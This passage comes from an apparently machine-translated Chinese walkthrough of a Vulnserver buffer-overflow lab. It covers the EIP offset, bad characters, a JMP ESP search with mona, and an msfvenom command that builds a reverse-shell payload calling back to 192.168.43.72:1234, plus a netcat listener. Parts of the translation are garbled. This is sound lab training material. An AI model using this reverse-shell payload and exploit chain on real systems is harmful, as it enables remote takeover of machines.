Create允许我们根据指定的字节数生成一定数量的字节。然后，我们可以将这些字节发送到Vulnserver，而不是A的，并尝试找到我们覆盖EIP的确切位置。图案偏移将帮助我们很快确定覆盖的位置。</p><p id="dbf5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Kali中，默认情况下，这些工具位于/usr/share/metasploit-framework/tools/exploit文件夹中。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi ox"><img src="../Images/0fed1855e0f45d7aa7bd4735f7f3b33b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*u2i6GNj9K5ELRAnFoTUEjw.png"/></div></div></figure><p id="fbbd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将编写一个新的<strong class="jp ir"> offest-value.py </strong>并创建一个包含上面生成的字符串的新变量‘shellcode’。</p><p id="9bbe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kt" href="https://github.com/shamsherkhan852/Buffer-Overflow-tools" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">下载offset_value.py </strong> </a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi oy"><img src="../Images/9449ee39935cea66a81a507253f14736.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QbCixSUz2mKbSbwCNgkxmw.png"/></div></div></figure><p id="fa4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们只需要发送这个代码一次。</p><p id="1419" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，在免疫调试器中点击“文件”并选择vulnserver.exe。</p><p id="684b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">单击播放按钮运行vulnserver.exe程序。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oz"><img src="../Images/a807faf171185a19e119c2443aea6934.png" data-original-src="https://miro.medium.com/v2/resize:fit:1092/format:webp/1*Az5dCVS9klmeoSqO3fB9Dg.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pa"><img src="../Images/682a60e729d6448b23b480481b483236.png" data-original-src="https://miro.medium.com/v2/resize:fit:1338/format:webp/1*VMp6qD0cb2aK4aaF6-0xKA.png"/></div></figure><p id="f690" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">观察<strong class="jp ir"> EIP </strong>寄存器-’<strong class="jp ir">386 f 4337</strong>。这个值实际上是我们使用模式创建工具生成的脚本的一部分。</p><p id="11fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了找出位置，我们将使用模式偏移工具。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/9d0f09f53d412bd324873fc2f95c3c5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1094/format:webp/1*joapDvMWaYNo54fqZeWVFg.png"/></div></figure><p id="8a7f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，我们现在知道了EIP开始的确切位置，我们现在可以试着控制EIP，这对我们的开发非常有用。</p><p id="fd05" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在将继续覆盖EIP。</p><p id="352a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">覆盖EIP</p><p id="d3fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道EIP从2003字节开始，我们可以修改代码来确认这一点。</p><p id="2502" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将是一种“试错”和“概念验证”的方式。</p><p id="1151" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将首先发送2003个“A ”,然后发送4个“B ”(因为EIP的大小是4字节)。</p><p id="83eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你们都明白我们在做什么。请你们都有点耐心，你们会度过难关的。</p><p id="08c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2003年的飓风将会到达(亲吻)EIP，但是不会覆盖EIP，但是飓风将会覆盖EIP。</p><p id="1c95" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们只是在测试它的射程，以确保万无一失。就是这样。</p><p id="8d98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编写新的python脚本:-<a class="ae kt" href="https://github.com/shamsherkhan852/Buffer-Overflow-tools" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">overwrite IP . py</strong></a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi oy"><img src="../Images/6ba9efb7c40612c77413665e869f1e5b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AmJlZqJg7rdGbY2iLQJqCA.png"/></div></div></figure><p id="8a37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，在免疫调试器中点击“文件”并选择vulnserver.exe。</p><p id="9f59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">单击播放按钮运行vulnserver.exe程序。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/8747a52460ce9e3bf4f4f63d8f37cbd1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1094/format:webp/1*klEV_7q0oU4nv7LOLy4oqQ.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi pc"><img src="../Images/6c8510a0928c714fbce1b4288adf9fb0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*X5iA3AtI4-GY02Mc90Z0nQ.png"/></div></div></figure><p id="93c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意，我们的EIP的值为‘42424242 ’,这正是我们想要的。</p><p id="0c03" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们将找出哪些字符被Vulnserver应用程序视为“坏字符”。</p><p id="e0c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">默认情况下，空字节(x00)总是被认为是坏字符，因为它会在执行时截断外壳代码。</p><p id="dd56" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">寻找坏人</strong></p><p id="a3b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一些字符会导致漏洞开发中的问题。我们必须通过Vulnserver程序运行每个字节(值为0–255，因为1字节的范围是0–255 ),以查看是否有任何字符导致问题。</p><p id="a474" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们已经知道，缺省情况下，空字节(x00)总是被认为是坏字符。</p><p id="8cc5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要查找Vulnserver中的坏字符，请在我们的代码中添加一个额外的变量“badchars ”,它包含除\x00之外的每个十六进制字符的列表。</p><p id="ab06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们生成Badchars</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/fc1c647bfd80494e2e2b75fe7384b208.png" data-original-src="https://miro.medium.com/v2/resize:fit:1278/format:webp/1*FpiW76sURwuWkXb2NppQtw.png"/></div></figure><p id="ed2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请随意在您的代码中使用上面的代码片段。</p><p id="aa70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">复制OverwriteEIP.py进行备份，并创建一个新文件badchars.py。</p><p id="273f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载<a class="ae kt" href="https://github.com/shamsherkhan852/Buffer-Overflow-tools" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> badchars.py </strong> </a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/dbc55f1f60bb847bed1d642652bf9fdc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1292/format:webp/1*V8AEaGxTl85vE2hFaii_hg.png"/></div></figure><p id="6c79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，在免疫调试器中点击“文件”并选择vulnserver.exe。</p><p id="431a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">单击播放按钮运行vulnserver.exe程序。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/e39cd3aa425bcf31f512c2808d54d953.png" data-original-src="https://miro.medium.com/v2/resize:fit:1076/format:webp/1*1DOlAn26rGaLmATfu23tlQ.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/cc051258cb7f10486935c872b77042c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*S1BuuuKz18EsUORIoaHuxQ.png"/></div></figure><p id="60f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">右键单击ESP寄存器并选择“转储跟随”</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi ph"><img src="../Images/2772015d12b7e81d7adb0b2ddcfe1351.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zspxgpDoMhmO2za3jLM4Lw.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/cf055aab81c531dddd9ff2a217f1e7c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:836/format:webp/1*ct3lJMbTtdtuQ1rbhp8GNg.png"/></div></figure><p id="96a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果一个坏角色出现了，它会立刻显得格格不入。但是在我们的例子中，Vulnserver应用程序中没有坏字符。</p><p id="6f96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">观察字符的顺序有多整齐和完美。它们结束于0xFF。</p><p id="2dee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">vulnserver.exe的优点是只有空字节(0x00)是坏字符。</p><p id="3ea2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">寻找合适的模块。</strong></p><p id="68f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">找到正确的模块意味着我们需要找到Vulnserver中没有任何内存保护的部分。我们将使用“mona模块”来找到它。</p><div class="nr ns gp gr nt nu"><a href="https://github.com/corelan/mona" rel="noopener  ugc nofollow" target="_blank"><div class="nv ab fo"><div class="nw ab nx cl cj ny"><h2 class="bd ir gy z fp nz fr fs oa fu fw ip bi translated">科勒兰/莫娜</h2><div class="ob l"><h3 class="bd b gy z fp nz fr fs oa fu fw dk translated">是一个python脚本，可以用来自动化和加速特定的搜索…</h3></div><div class="oc l"><p class="bd b dl z fp nz fr fs oa fu fw dk translated">github.com</p></div></div><div class="od l"><div class="pj l of og oh od oi kr nu"/></div></div></a></div><p id="0ce8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载mona.py并将该文件粘贴到该路径</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi pk"><img src="../Images/39a557a5e434c32f7a3ef522809f3e8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DTegnjsEAAnJgIkP9YDZrQ.png"/></div></div></figure><p id="2582" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以管理员身份重新打开Vulnserver和免疫调试器。不玩服务器</p><p id="d990" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在底部豁免搜索栏中输入-</p><p id="4cf1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">！梦娜模块</strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi pl"><img src="../Images/488f11efd1739bcd56b90a769a642c91.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5bpJEa0betVvBWVWzYWtlQ.png"/></div></div></figure><p id="2674" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">会出现一个表格，上面的奇怪数字都是绿色的。</p><p id="138e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在桌子对面寻找“错误”。这意味着该模块中没有内存保护。</p><p id="e8a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">essfunc.dll</strong>作为Vulnserver的一部分运行，没有内存保护。把它记下来。</p><p id="fc33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们将找到JMP ESP的操作码等价物。我们使用JMP ESP，因为我们的EIP将指向JMP ESP位置，这将跳转到我们稍后将注入的恶意外壳代码。</p><h1 id="b1c8" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">寻找有用指令的十六进制代码</h1><p id="b815" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy no ka kb kc np ke kf kg nq ki kj kk ij bi translated">Kali Linux包含一个将汇编语言转换成十六进制代码的实用程序。</p><p id="2a75" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Kali Linux中，在终端窗口中执行以下命令:</p><blockquote class="pm pn po"><p id="a93d" class="jn jo pp jp b jq jr js jt ju jv jw jx pq jz ka kb pr kd ke kf ps kh ki kj kk ij bi translated"><code class="fe pt pu pv mr b"><strong class="jp ir"><em class="iq">locate nasm_shell</em></strong></code></p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pw"><img src="../Images/ab5e6969828b9d5853825f71e7697569.png" data-original-src="https://miro.medium.com/v2/resize:fit:1180/format:webp/1*bUsJ2yHbYRL4xOXYPgdq_A.png"/></div></figure><p id="0dde" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">“JMP ESP”指令的十六进制代码是FFE4。</p><p id="4291" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们将使用这些信息找到指针地址。我们将把这个指针地址放到EIP中，指向我们的恶意外壳代码。</p><p id="cee9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们的豁免搜索栏中输入-</p><blockquote class="pm pn po"><p id="349d" class="jn jo pp jp b jq jr js jt ju jv jw jx pq jz ka kb pr kd ke kf ps kh ki kj kk ij bi translated"><strong class="jp ir">T8】！莫娜find-s " \ xff \ xe4 "-米essfunc.dll</strong></p></blockquote><pre class="km kn ko kp gt mq mr ms mt aw mu bi"><span id="5783" class="mv lc iq mr b gy mw mx l my mz">where -s  is the byte string to search for, and -m  specifies the module to search in</span></pre><p id="527b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它显示了所有可能的正确模块</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi px"><img src="../Images/480c297a90416a94bfdea2e3337f4683.png" data-original-src="https://miro.medium.com/v2/resize:fit:1256/format:webp/1*Gg6lFNZsDwBhkHGu3v-MuA.png"/></div></figure><p id="0700" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们发现内存中有9个位置(重启程序时不会改变地址)保存着“JMP ESP”指令。</p><p id="1447" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个地址列表，我们可以用它作为指针。地址位于左侧，白色。</p><p id="96a8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将选择第一个地址- <strong class="jp ir"> 625011AF </strong>并将其添加到我们的Python脚本shell.py中</p><p id="36d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注1:根据您运行的Windows版本，您的地址可能会有所不同。因此，如果地址不同，不要惊慌！</p><p id="98a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">地址是十六进制的-</p><p id="3083" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> \xaf\x11\x50\x62 </strong></p><p id="fb23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个一个试(复制首地址=625011af)免疫。点击黑色右箭头&gt;:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pc"><img src="../Images/e61a927381eb38d1b3b055ecb74d2c49.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*DnP2RO3u6bRpX6PSEQvVKw.png"/></div></figure><p id="81d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">粘贴625011af和ok</p><p id="c933" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">右键单击625011AF断点&gt;切换</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi py"><img src="../Images/62b9c9635ab0270e1e4a5ab0654dd395.png" data-original-src="https://miro.medium.com/v2/resize:fit:1206/format:webp/1*TbHr9Bxer5jFJAgos9hcBw.png"/></div></figure><p id="b903" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在玩服务器</p><p id="1cc0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">download<a class="ae kt" href="https://github.com/shamsherkhan852/Buffer-Overflow-tools" rel="noopener ugc nofollow" target="_blank">T16】find _ right _ module . pyT18】</a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi pz"><img src="../Images/de23200ec70979709f5dc381524ab0a2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G5SF5XbQ-VJHI-R38mjzgw.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi qa"><img src="../Images/6da7815df396c2ce5a3465ec70569a06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1084/format:webp/1*zRmuFzAaGmhh620XSLaY3A.png"/></div></figure><p id="404e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">(它显示了我们在EIP的复制地址)</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/89ea23dfcb0a287a103c02507ea88eb0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1292/format:webp/1*Ej8RmGD7KdYR83Ids8tfug.png"/></div></figure><p id="c6b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果EIP显示我们的复制地址，那么它是正确的模块</p><p id="c756" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注意2 </strong>:这样看起来会有点怪。这是一个32位应用程序。这意味着系统使用x86的“小端”架构格式，换句话说，“最低有效字节优先”我们必须在x86架构中使用Little Endian格式，因为低阶字节存储在内存的最低地址，高阶字节存储在最高地址。</p><h2 id="c3b7" class="mv lc iq bd ld nd ne dn lh nf ng dp ll jy nh ni lp kc nj nk lt kg nl nm lx nn bi translated">正在生成反向外壳有效负载-</h2><pre class="km kn ko kp gt mq mr ms mt aw mu bi"><span id="a04f" class="mv lc iq mr b gy mw mx l my mz"><strong class="mr ir">sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.72 LPORT=1234 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c</strong></span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi qb"><img src="../Images/3951b7e5b40b5aad2b7b3a41c8ef0bf6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7PwlQyGSYs1M8uTjKEeGVg.png"/></div></div></figure><p id="3c99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载<a class="ae kt" href="https://github.com/shamsherkhan852/Buffer-Overflow-tools" rel="noopener ugc nofollow" target="_blank">T3】exploit . pyT5】</a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi qc"><img src="../Images/8b0bee222819c332fbaacb16eb97159c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/1*M-5zsA94xf8d9omzm3nlwA.png"/></div></figure><p id="3e91" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据TCM——我们必须创建一个名为“exploit”的变量，并将恶意外壳代码放入其中。我们还必须将'<strong class="jp ir"> 32 * \x90 </strong>'添加到shellcode变量(32 \x90字节)中。这是标准做法。0x90字节也称为NOP，即无操作。它实际上什么都不做。但是，在开发漏洞时，我们可以将其用作填充。有些情况下，我们的漏洞利用代码会干扰我们的返回地址，无法正常运行。为了避免这种干扰，我们可以在两个项目之间添加一些填充。</p><p id="ccf8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在创建有效负载期间提到的同一端口上启动nc监听器— 1234。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi qd"><img src="../Images/d7aca32832b38180313c6d42ebf51f24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1090/format:webp/1*SCoYmIrezbaSMkk7v16Swg.png"/></div></figure><p id="9278" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">重新启动vulnserver(CTRL+F2)和play server(F9)</p><p id="65fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在新的终端选项卡中执行shell.py。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi qe"><img src="../Images/660fa23566f89c02029343fee5a00588.png" data-original-src="https://miro.medium.com/v2/resize:fit:1104/format:webp/1*wrlPDUJPuZaTFxq3b_OdkA.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi qc"><img src="../Images/4acb637dd8d1d94f659cd11ad7466f3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/1*Q-1ZBvkwUCG8SDH9KA3zZA.png"/></div></figure><p id="9844" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在:<br/><strong class="jp ir">LinkedIn:-</strong><a class="ae kt" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="jp ir">Twitter:-</strong><a class="ae kt" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="jp ir">Tryhackme:-</strong><a class="ae kt" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi qf"><img src="../Images/09e5bbba06c7688a702aeec8570d243c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*Vve7XR6kstH7qA5iQQ-kYA.png"/></div></figure><p id="9f6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如需更多演练，请在出发前继续关注…<br/>…</p><p id="890f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">点击此处加入电报</strong><br/><a class="ae kt" href="https://t.me/tryhackme_writeups" rel="noopener ugc nofollow" target="_blank">https://t.me/tryhackme_writeups</a></p><p id="dd62" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问我的其他演练:-</p><p id="2057" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kt" href="https://shamsher-khan.medium.com/tryhackme-oscp-buffer-overflow-prep-overflow-1-edfaa6c0945e" rel="noopener">https</a><a class="ae kt" rel="noopener ugc nofollow" target="_blank" href="/tryhackme-oscp-buffer-overflow-prep-overflow-1-19e000482f27">://infosecwriteups . com/tryhackme-oscp-buffer-overflow-prep-overflow-1-19e 000482 f27</a></p><p id="a628" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您花时间阅读我的演练。<br/>如果您觉得有帮助，请点击👏按钮👏(高达40倍)并分享<br/>它来帮助其他有类似兴趣的人！+随时欢迎反馈！</p></div></div>    
</body>
</html>